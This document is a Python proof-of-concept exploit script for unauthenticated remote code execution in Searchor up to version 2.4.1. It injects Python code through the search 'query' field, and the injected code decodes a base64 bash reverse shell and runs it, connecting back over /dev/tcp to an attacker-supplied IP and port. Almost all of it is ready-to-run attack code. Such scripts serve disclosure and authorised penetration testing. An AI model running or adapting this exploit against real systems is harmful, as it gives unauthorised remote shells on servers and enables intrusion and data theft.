# Exploit Title: Searchor - Unauthenticated Remote Code Execution
# Date: 09-04-2023
# Exploit Author: Jacob Ebben
# Version: Searchor <= 2.4.1
# Tested on: Searchor 2.4.0

#!/usr/bin/env python3

import argparse
import requests
import urllib3
import base64
from termcolor import colored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def print_message(message, type):
    if type == 'SUCCESS':
        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
    elif type == 'INFO':
        print('[' + colored('INFO', 'blue') +  '] ' + message)
    elif type == 'WARNING':
        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
    elif type == 'ALERT':
        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
    elif type == 'ERROR':
        print('[' + colored('ERROR', 'red') +  '] ' + message)


class POC:
    def __init__(self, target, ip, port, proxy):
        self.base_url = self._get_normalized_url(target)
        self.payload = self._get_payload(ip, port)
        self.proxies = self._get_proxies(self.base_url, proxy) if proxy else {}

        self.session = requests.Session()


    def exploit(self):
        print_message("Starting exploitation ...", "INFO")
        url = self.base_url + "search"
        data = {
            "engine": "Google",
            "query": self.payload
        }
        print_message("Sending payload!", "INFO")
        self.session.post(url, data=data, proxies=self.proxies)


    def _get_payload(self, ip, port):
        rev_shell = f'bash -c "exec bash -i &>/dev/tcp/{ip}/{port} <&1"'
        rev_shell_bytes = rev_shell.encode('ascii')
        rev_shell_base64 = base64.b64encode(rev_shell_bytes).decode('ascii')
        command = f"echo {rev_shell_base64} | base64 -d | bash"
        cradle = f"')+__import__('os').system('{command}')#"
        return cradle

    def _get_normalized_url(self, url):
        if url[-1] != '/':
            url += '/'
        if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
            url = "http://" + url
        return url

    def _get_proxies(self, target_url, proxy_url):
        return {self._get_url_protocol(target_url): self._get_normalized_url(proxy_url)}

    def _get_url_protocol(self, url):
        if url[0:8].lower() == 'https://':
            return 'https'
        return 'http' 

def main():
    parser = argparse.ArgumentParser(description="Searchor - Unauthenticated Remote Code Execution")

    parser.add_argument('-t', '--target', required=True, type=str, help="url of the vulnerable site (Example: \"http://127.0.0.1/searchor\" or \"https://searchor.example.xyz/\")"),
    parser.add_argument('-I', '--atk-ip', required=True, type=str, help='attacker ip for reverse shell'),
    parser.add_argument('-P', '--atk-port', required=True, type=str, help='attacker port for reverse shell'),
    parser.add_argument('-x', '--proxy', default=None, type=str, help='http proxy address (Example: http://127.0.0.1:8080/)'),

    args = parser.parse_args()

    exploit = POC(args.target, args.atk_ip, args.atk_port, args.proxy)
    
    exploit.exploit()


if __name__ == "__main__":
    main()
